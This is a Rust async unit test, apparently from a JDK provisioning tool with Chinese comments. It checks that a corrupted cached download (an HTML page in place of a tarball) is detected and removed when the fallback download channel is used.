    async fn test_ensure_channel_b_invalid_cached_tarball_removed() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 1),                // 远端缓存未命中
            ("/usr/bin/curl\n", 0), // command -v curl
            ("", 1),                // 通道 A 下载失败 → 落到通道 B
        ]));
        let tmp = tempfile::tempdir().unwrap();
        let cache = tmp.path().join("cache");
        std::fs::create_dir_all(&cache).unwrap();
        // 预置一个损坏的小文件在缓存路径 → download_to_cache 命中 → validate 失败
        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
        let url = build_download_url("https://artifactory.example.com/artifactory/release", &probe).unwrap();
        let dest = crate::provision::transfer::cache_path_for(&cache, &url);
        std::fs::write(&dest, b"<html>not a tarball</html>").unwrap();
        let mut ctx = test_ctx(channel);
        ctx.cache_dir = cache;
        let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
        assert_eq!(err.code, "provision_failed");
        assert_eq!(err.stage, "download_local");
        assert!(!dest.exists(), "invalid cached tarball must be removed so retry can re-download");
    }
}
